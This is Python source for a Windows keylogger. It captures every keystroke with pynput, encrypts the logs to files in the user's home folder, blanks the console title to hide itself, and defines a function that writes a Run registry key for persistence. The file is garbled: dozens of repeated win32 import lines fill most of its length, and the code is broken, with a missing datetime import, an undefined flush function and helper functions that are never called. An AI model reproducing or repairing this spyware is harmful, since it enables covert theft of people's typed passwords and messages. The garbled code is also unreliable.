import pynput
from pynput.keyboard import Listener
import logging
import os
import platform
import threading
import socket
import time
import base64
from cryptography.fernet import Fernet
import subprocess
import sys
import ctypes
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security
import win32api
import win32con
import win32gui
import win32process
import pynput
from pynput.keyboard import Listener
import logging
import os
import platform
import threading
import socket
import time
import base64
from cryptography.fernet import Fernet
import subprocess
import sys
import ctypes
import win32api
import win32con
import win32gui
import win32process
import win32event
import win32security

# Configuration
log_directory = os.path.expanduser("~/keylogger_logs")
os.makedirs(log_directory, exist_ok=True)
log_file = os.path.join(log_directory, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Logging setup
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Buffer to reduce disk I/O
log_buffer = []
BUFFER_SIZE = 10

# Function to log keystrokes
def on_press(key):
    try:
        log_buffer.append(f"{key.char}")
    except AttributeError:
        log_buffer.append(f"{key}")

    if len(log_buffer) >= BUFFER_SIZE:
        flush_buffer()

# Function to flush buffer to file
def flush_buffer():
    with open(log_file, "a") as f:
        f.write(cipher_suite.encrypt("".join(log_buffer).encode('utf-8')).decode('utf-8') + "\n")
    log_buffer.clear()

# Function to hide the keylogger process
def hide_process():
    ctypes.windll.kernel32.SetConsoleTitleW("")

# Function to add persistence
def add_persistence():
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, win32con.KEY_SET_VALUE)
    win32api.RegSetValueEx(key, "Keylogger", 0, win32con.REG_SZ, sys.executable)
    win32api.RegCloseKey(key)

# Start buffer flushing thread
flush_thread = threading.Thread(target=periodic_flush, daemon=True)
flush_thread.start()

# Start listening to the keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()

print(f"Keylogger started. Logs saved to: {log_file}")